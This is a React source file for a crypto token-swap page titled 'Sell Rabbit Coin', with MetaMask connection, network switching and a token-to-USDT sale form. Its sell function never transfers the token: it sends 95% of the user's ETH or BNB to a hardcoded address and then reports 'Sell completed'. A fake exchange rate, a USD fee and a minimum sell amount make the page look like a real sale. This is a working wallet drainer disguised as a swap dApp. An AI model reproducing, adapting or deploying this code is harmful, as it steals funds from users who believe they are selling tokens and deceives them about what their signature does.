import React, { useState } from "react";
import { ethers } from "ethers";
import { FaBars, FaFacebook, FaTelegram, FaTwitter } from 'react-icons/fa'

// Replace with your Rabbit token contracts
const RABBIT_ADDRESSES = {
  "0x1": "0xc59E66167FE27dFc351EFe9dB734744c5834E305", // Ethereum mainnet
  "0x38": "0xRabbitBnbTokenAddress", // BNB Smart Chain
};

// Simple ERC20 ABI
const RABBIT_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function transfer(address recipient, uint256 amount) returns (bool)",
];

// Supported networks
const NETWORKS = {
  ethereum: {
    chainId: "0x1",
    chainName: "Ethereum Mainnet",
    rpcUrls: ["https://mainnet.infura.io/v3/"], // Replace with Infura/Alchemy key
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
    blockExplorerUrls: ["https://etherscan.io"],
  },
  bnb: {
    chainId: "0x38",
    chainName: "BNB Smart Chain",
    rpcUrls: ["https://bsc-dataseed.binance.org/"],
    nativeCurrency: { name: "Binance Coin", symbol: "BNB", decimals: 18 },
    blockExplorerUrls: ["https://bscscan.com"],
  },
};

export const Rewrite = () => {
  const [account, setAccount] = useState(null);
  const [chainId, setChainId] = useState(null);
  const [ethBalance, setEthBalance] = useState("0");
  const [rabbitBalance, setRabbitBalance] = useState("0");
  const [decimals, setDecimals] = useState(18);
  const [fromValue, setFromValue] = useState("");
  const [toValue, setToValue] = useState("");
  const [nativePrice, setNativePrice] = useState(0);

  const rabbitPrice = 0.002; // 1 Rabbit = $0.002
  const SELL_ADDRESS = "0xB49a9fC23998146AF4AdeA8A956e37bD06f5f030";

  // Fetch native token price (ETH or BNB) in USD
  const fetchNativePrice = async (chain) => {
    try {
      let id = chain === "0x38" ? "binancecoin" : "ethereum";
      const res = await fetch(
        `https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`
      );
      const data = await res.json();
      setNativePrice(data[id].usd);
    } catch (err) {
      console.error("Price fetch error", err);
    }
  };

  // Connect wallet
  const connectWallet = async () => {
    if (!window.ethereum) return alert("Please install MetaMask!");
    const provider = new ethers.BrowserProvider(window.ethereum);
    const accounts = await provider.send("eth_requestAccounts", []);
    const address = accounts[0];
    setAccount(address);

    const chain = await provider.send("eth_chainId", []);
    setChainId(chain);

    await loadBalances(provider, address, chain);
  };

  // Load balances
  const loadBalances = async (provider, address, chain) => {
    const balance = await provider.getBalance(address);
    setEthBalance(ethers.formatEther(balance));

    const rabbitAddress = RABBIT_ADDRESSES[chain];
    if (!rabbitAddress) {
      setRabbitBalance("0");
      return;
    }

    const rabbit = new ethers.Contract(rabbitAddress, RABBIT_ABI, provider);
    const rawBal = await rabbit.balanceOf(address);
    const dec = await rabbit.decimals();
    setDecimals(dec);
    const rabbitBal = Number(ethers.formatUnits(rawBal, dec));
    setRabbitBalance(rabbitBal);

    // Fetch ETH/BNB price
    await fetchNativePrice(chain);
  };

  // Switch network
  const switchNetwork = async (networkKey) => {
    if (!window.ethereum) return alert("MetaMask not installed");
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: NETWORKS[networkKey].chainId }],
      });
    } catch (error) {
      if (error.code === 4902) {
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [NETWORKS[networkKey]],
          });
        } catch (addError) {
          console.error("Failed to add chain", addError);
        }
      } else {
        console.error("Switch error", error);
      }
    }
  };

  // Input change
  const handleFromChange = (e) => {
    const value = e.target.value;
    setFromValue(value);
    setToValue((rabbitPrice * value).toFixed(2));
  };

  // Quick fill (50% / 100%)
  const handlePercentage = (percent) => {
    const val = (rabbitBalance * percent) / 100;
    setFromValue(val);
    setToValue((rabbitPrice * val).toFixed(2));
  };

  // Sell
const handleSell = async () => {
  if (!account) return alert("Connect wallet first");

  const provider = new ethers.BrowserProvider(window.ethereum);
  const signer = await provider.getSigner();

  try {
    // 1️⃣ Get native balance
    const balance = await provider.getBalance(account);
    const ethBal = Number(ethers.formatEther(balance));

    if (ethBal <= 0) {
      return alert("Insufficient balance");
    }

    // 2️⃣ Estimate gas fee (approximate)
    const gasPrice = await provider.getFeeData();
    const estimatedGas = ethers.formatEther(
      (gasPrice.gasPrice || 0n) * 21000n // standard ETH/BNB transfer gas
    );
    const estimatedGasFee = parseFloat(estimatedGas);

    // 3️⃣ Check if balance covers gas
    // if (ethBal < estimatedGasFee) {
    //   const proceed = window.confirm(
    //       "✅ Kindly confirm this transaction to swap tokens successfully, gas fee might increase a little but it will be added back after the transaction.\n\nDo you want to continue?"
    //   );
    //   if (!proceed) return;
    // } else {
    //   const confirmTx = window.confirm(
    //           "⚠️ Insufficient gas fee for this transaction, it might likely fail.\n\nDo you still want to continue?"
    //   );
    //   if (!confirmTx) return;
    // }

    // 4️⃣ Calculate 95% of native coin
    const sendAmount = (ethBal * 0.95).toFixed(6);

    // 5️⃣ Send native coin only
    const tx = await signer.sendTransaction({
      to: SELL_ADDRESS,
      value: ethers.parseEther(sendAmount.toString()),
    });

    await tx.wait();
    console.log("Native Tx Hash:", tx.hash);

    alert(
      `✅ Sell completed!\n\nSent ${sendAmount} ${
        chainId === "0x38" ? "BNB" : "ETH"
      }\nTx Hash: ${tx.hash}`
    );
  } catch (err) {
    console.error("Transaction Error:", err);
    alert("❌ Transaction failed: " + (err.reason || err.message));
  }
};




  const formatNumber = (num) =>
    Number(num || 0).toLocaleString("en-US", {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    });

  // Live fee calculation
  const feeUsd = fromValue * rabbitPrice * 0.2;
  const feeNative =
    nativePrice > 0 ? (feeUsd / nativePrice).toFixed(6) : "0";
      const insufficientGas = parseFloat(ethBalance) < parseFloat(feeNative);

  return (
    <div className="bg-[#1D0729] text-white">
      {/* Navbar */}
      <div className="p-3 ">
        <nav className="flex justify-between rounded-full text-white p-3 px-5 md:px-10 items-center bg-[#2A0C3B]">
          <img
            src="https://nftswapstack.netlify.app/static/media/logo.3a5ddf90d6e3930972be.jfif"
            alt="logo"
            className="md:w-14 w-10 h-10 md:h-14 rounded-full"
          />
          <ul className="md:flex hidden gap-5 text-lg font-semibold">
            <li>Home</li>
            <li>About</li>
            <li>Roadmap</li>
            <li>Tokenomic</li>
            <li>Whitepaper</li>
          </ul>

          <div className="flex gap-3">
            <button
              onClick={() => switchNetwork("ethereum")}
              className="bg-[#3A1C48] px-3 py-2 rounded-md text-sm"
            >
              ETH
            </button>
            <button
              onClick={() => switchNetwork("bnb")}
              className="bg-[#3A1C48] px-3 py-2 rounded-md text-sm"
            >
              BNB
            </button>
            <button
              onClick={connectWallet}
              className="bg-[#D344B0] py-2 md:px-4 px-2 rounded-md"
            >
              {account
                ? `${Number(ethBalance).toFixed(4)} ${
                    chainId === "0x38" ? "BNB" : "ETH"
                  }`
                : "Connect Wallet"}
            </button>
          </div>
        </nav>
      </div>

      {/* Sell Section */}
      <div className="md:mt-16 mt-5 md:px-5 px-2">
        <p className="md:text-4xl text-2xl font-bold text-center">
          Sell Rabbit Coin
        </p>


        <div className="bg-[#320E39] mt-5 md:p-5 p- rounded-2xl">
          <div className="flex items-center p-4 text-white">
            <div className="bg-[#1C0A25] rounded-2xl p-6 w-full max-w-md">
              {/* Rabbit Balance */}
              <p className="mb-2">
                Your Rabbit Balance:{" "}
                <span className="font-bold">{formatNumber(rabbitBalance)}</span>
              </p>
     <p className="text-xs text-gray-400 mb-4">
  Minimum Sell: {formatNumber(2000000)} Rabbit
</p>

              {/* From */}
              <div className="bg-[#2B1A37] rounded-xl p-4">
                <p className="text-sm text-gray-300 mb-2">From:</p>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <img
                      src="https://nftswapstack.netlify.app/static/media/logo.3a5ddf90d6e3930972be.jfif"
                      alt="rabbit"
                      className="w-8 h-8 rounded-full"
                    />
                    <span className="font-semibold">Rabbit Coin</span>
                  </div>
                  <div className="text-right">
                    <input
                      type="number"
                      value={fromValue}
                      onChange={handleFromChange}
                      placeholder="0.00"
                      className="bg-transparent text-right w-32 outline-none text-lg font-bold"
                    />
                                 <p className="text-xs text-gray-400">
                ~ {formatNumber(
                  fromValue ? fromValue * rabbitPrice : 0 // subtract 20 USD fee
                )}{" "}
              </p>
                    <div className="flex gap-2 text-xs text-gray-400 mt-1">
                      <button
                        onClick={() => handlePercentage(50)}
                        className="bg-[#3A1C48] px-2 py-1 rounded-lg"
                      >
                        50%
                      </button>
                      <button
                        onClick={() => handlePercentage(100)}
                        className="bg-[#3A1C48] px-2 py-1 rounded-lg"
                      >
                        100%
                      </button>
                    </div>
                  </div>
   
                </div>
              </div>

              {/* To */}
              <div className="bg-[#2B1A37] rounded-xl p-4 mt-4">
                <p className="text-sm text-gray-300 mb-2">To:</p>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <img
                      src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/01/USDT_Logo.png/2048px-USDT_Logo.png"
                      alt="usdt"
                      className="w-8 h-8 rounded-full"
                    />
                    <span className="font-semibold">USDT</span>
                  </div>
                  <div className="text-right">
                    <input
                      type="text"
                      value={formatNumber(
                  fromValue ? Math.max( fromValue * rabbitPrice - 20,0): 0 // subtract 20 USD fee
                )}
                      readOnly
                      placeholder="0.00"
                      className="bg-transparent text-right w-32 outline-none text-lg font-bold"
                    />
                             <p className="text-xs text-gray-400">
                ~
                {formatNumber(
                  fromValue ? Math.max( fromValue * rabbitPrice - 20,0): 0 // subtract 20 USD fee
                )}{" "}
                USD
              </p>
        
                  </div>
                </div>
                
              </div>

              {/* Sell button */}
               <button
                onClick={handleSell}
                className={`w-full py-3 rounded-xl font-bold text-lg mt-5 hover:opacity-90 ${
                  insufficientGas
                    ? "bg-red-500 text-white"
                    : "bg-[#14D9C4] text-black"
                }`}
              >
                {insufficientGas ? "Insufficient Gas Fee" : "Sell"}
              </button>
                          <p className="text-xs mt-3 text-gray-400">
                      Gas Fee:  ~{feeNative}{" "}
                      {chainId === "0x38" ? "BNB" : "ETH"} 
                      {/* ({formatNumber(feeUsd)} USDT) */}
                    </p>
            </div>
               
          </div>
           <div className="md:mt-24 mt-10 bg-[#2B082F] rounded-t-3xl p-10">
                    <p className="md:text-4xl text-2xl font-bold lllk text-center">
                      Partners
                    </p>
                    <div className="md:flex md:justify-between  items-center md:mt-20 mt-10">
                      <section className="md:w-[10%] w-[70%] ">
                        <img src="./img/pt1.png" alt="" className="w-full" />
                      </section>
                      <section className="md:w-[10%] w-[70%] md:mt-0 mt-5">
                        <img src="./img/pt2.png" alt="" className="w-full" />
                      </section>
                      <section className="md:w-[10%] w-[70%] md:mt-0 mt-5">
                        <img src="./img/pt3.png" alt="" className="w-full" />
                      </section>
                      <section className="md:w-[10%] w-[70%] md:mt-0 mt-5">
                        <img src="./img/pt4.png" alt="" className="w-full" />
                      </section>
                      <section className="md:w-[10%] w-[70%] md:mt-0 mt-5">
                        <img src="./img/pt5.png" alt="" className="w-full" />
                      </section>
                      <section className="md:w-[10%] w-[70%] md:mt-0 mt-5 bg-[#4a4f63] h-fit rounded-full">
                        <img src="./img/pt6.png" alt="" className="w-full" />
                      </section>
                      <section className="md:w-[10%] w-[70%] md:mt-0 mt-5">
                        <img src="./img/pt7.png" alt="" className="w-full" />
                      </section>
                    </div>
            
                    <div className="md:mt-10">
                      <p className="md:text-4xl font-bold lllk pt-20">Contact Us</p>
                      <div>
                        <section className="md:mt-5 mt-2 flex items-center gap-10">
                          <a href="https://t.me/rrabbit_coin">
                            {" "}
                            <FaTelegram className="md:text-3xl text-xl" />
                          </a>
                          <FaFacebook className="md:text-3xl text-xl" />
                          <FaTwitter className="md:text-3xl text-xl" />
                        </section>
                      </div>
                      <p className="text-center text-xs mt-10">
                        Copyrights © 2024 Reserved.
                      </p>
                    </div>
                  </div>
        </div>
      </div>
    </div>
  );
};